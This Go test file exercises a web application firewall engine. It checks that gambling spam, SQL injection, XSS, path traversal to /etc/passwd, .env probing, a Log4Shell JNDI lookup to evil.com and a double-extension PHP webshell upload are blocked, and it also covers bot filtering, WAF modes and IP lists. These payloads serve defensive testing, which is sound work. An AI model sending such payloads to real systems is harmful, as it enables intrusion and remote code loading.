package waf

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/theboynewbie/athena-shield/internal/config"
	"github.com/theboynewbie/athena-shield/internal/ratelimit"
	"github.com/theboynewbie/athena-shield/internal/store"
)

func setupTestEngine(t *testing.T) (*Engine, *store.Store, *ratelimit.RateLimiter) {
	t.Helper()
	dir := t.TempDir()
	s, err := store.Open(dir, "admin", "admin@test.local", "GuardianWAF@2026")
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { s.Close() })

	cfg := config.Load()
	cfg.AutoBanThreshold = 5
	rl := ratelimit.New(cfg, s, nil)
	eng := NewEngine(cfg, s, rl)
	return eng, s, rl
}

func makeReq(method, target string, ua string, body []byte, contentType string) *http.Request {
	req := httptest.NewRequest(method, target, bytes.NewReader(body))
	req.RemoteAddr = "203.0.113.50:12345"
	if ua != "" {
		req.Header.Set("User-Agent", ua)
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0")
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	return req
}

func TestDetectionsAndNormalization(t *testing.T) {
	eng, _, _ := setupTestEngine(t)
	host := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: true, WAFMode: "active", RateLimitEnabled: true, AppProfile: "universal", BlockBadBots: true, IsActive: true}

	cases := []struct {
		name      string
		method    string
		target    string
		ua        string
		body      string
		wantBlock bool
	}{
		{"Clean home", "GET", "http://kampus.ac.id/", "", "", false},
		{"Judi slot plain", "GET", "http://kampus.ac.id/?s=slot+gacor+hari+ini", "", "", true},
		{"Judi slot leetspeak", "GET", "http://kampus.ac.id/?s=sl0t+g4c0r+m4xw1n", "", "", true},
		{"Judi slot zero-width", "GET", "http://kampus.ac.id/?s=s\u200blot+gacor", "", "", true},
		{"Judi slot homoglyph", "GET", "http://kampus.ac.id/?s=ѕlot+gаcor", "", "", true},
		{"SQLi union select", "GET", "http://kampus.ac.id/?id=1+UNION+SELECT+1,2,3", "", "", true},
		{"XSS script tag", "POST", "http://kampus.ac.id/comment", "", "<script>alert(1)</script>", true},
		{"Path traversal", "GET", "http://kampus.ac.id/../../etc/passwd", "", "", true},
		{"Sensitive .env", "GET", "http://kampus.ac.id/.env", "", "", true},
		{"Log4Shell", "GET", "http://kampus.ac.id/", "${jndi:ldap://evil.com/a}", "", true},
		{"Bad bot ClaudeBot", "GET", "http://kampus.ac.id/", "ClaudeBot/1.0", "", true},
		{"Good bot Googlebot", "GET", "http://kampus.ac.id/", "Mozilla/5.0 (compatible; Googlebot/2.1)", "", false},
		{"WP Admin Mine tab exempt", "GET", "http://kampus.ac.id/wp-admin/edit.php?post_type=post&author=1", "", "", false},
		{"Public author enum blocked", "GET", "http://kampus.ac.id/?author=1", "", "", true},
		{"OPAC author search exempt", "GET", "http://kampus.ac.id/?keywords=buku&author=1", "", "", false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := makeReq(tc.method, tc.target, tc.ua, []byte(tc.body), "application/x-www-form-urlencoded")
			dec := eng.Inspect(req, host, []byte(tc.body))
			if dec.Blocked != tc.wantBlock {
				t.Fatalf("got Blocked=%v (reason=%q), want %v", dec.Blocked, dec.Reason, tc.wantBlock)
			}
		})
	}
}

func TestModesBypassAndMonitor(t *testing.T) {
	eng, _, _ := setupTestEngine(t)
	req := makeReq("GET", "http://kampus.ac.id/?q=slot+gacor", "", nil, "")

	bypassHost := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: false, WAFMode: "bypass", IsActive: true}
	dec := eng.Inspect(req, bypassHost, nil)
	if dec.Blocked || dec.Mode != "bypass" {
		t.Fatalf("expected bypass, got %+v", dec)
	}

	monHost := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: true, WAFMode: "monitor", RateLimitEnabled: false, IsActive: true}
	dec = eng.Inspect(req, monHost, nil)
	if !dec.Blocked || dec.Mode != "monitor" {
		t.Fatalf("expected monitor detection, got %+v", dec)
	}
}

func TestIPListsCIDRAndMultipartUpload(t *testing.T) {
	eng, s, _ := setupTestEngine(t)
	if err := s.AddIP(&store.IPList{IPAddress: "198.51.100.0/24", ListType: "WHITELIST", Reason: "trusted"}); err != nil {
		t.Fatal(err)
	}
	if err := s.AddIP(&store.IPList{IPAddress: "192.0.2.10", ListType: "BLACKLIST", Reason: "banned"}); err != nil {
		t.Fatal(err)
	}
	eng.Reload()

	host := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: true, WAFMode: "active", IsActive: true}

	// Whitelisted CIDR passes even with SQLi
	reqWhite := makeReq("GET", "http://kampus.ac.id/?id=1+UNION+SELECT+1", "", nil, "")
	reqWhite.RemoteAddr = "198.51.100.42:1234"
	if dec := eng.Inspect(reqWhite, host, nil); dec.Blocked {
		t.Fatalf("expected whitelisted CIDR to pass, got %+v", dec)
	}

	// Blacklisted IP blocked
	reqBlack := makeReq("GET", "http://kampus.ac.id/", "", nil, "")
	reqBlack.RemoteAddr = "192.0.2.10:1234"
	if dec := eng.Inspect(reqBlack, host, nil); !dec.Blocked {
		t.Fatalf("expected blacklisted IP to be blocked")
	}

	// Multipart webshell double extension blocked
	mpBody := []byte("--abc\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.png\"\r\nContent-Type: image/png\r\n\r\n<?php echo 1; ?>\r\n--abc--\r\n")
	reqUp := makeReq("POST", "http://kampus.ac.id/upload", "", mpBody, "multipart/form-data; boundary=abc")
	if dec := eng.Inspect(reqUp, host, mpBody); !dec.Blocked {
		t.Fatalf("expected double-extension webshell upload to be blocked")
	}
}
